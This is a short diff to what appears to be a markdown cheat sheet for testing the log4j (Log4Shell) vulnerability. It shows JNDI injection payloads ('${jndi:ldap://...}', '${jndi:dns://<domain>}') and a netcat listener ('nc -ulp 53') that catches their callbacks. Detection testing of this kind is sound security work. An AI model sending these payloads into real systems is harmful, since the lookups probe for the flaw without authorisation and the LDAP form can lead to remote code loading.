@@ -96,7 +96,8 @@ ${jndi:ldap://domain.com:1234/a}
  
 Easy test for log4j dns lookups:
 ```
-${jndi:dns://domain.com}
+${jndi:dns://<domain>} 
+${jndi:dns://<ip>}
 nc -ulp 53
 ```
 
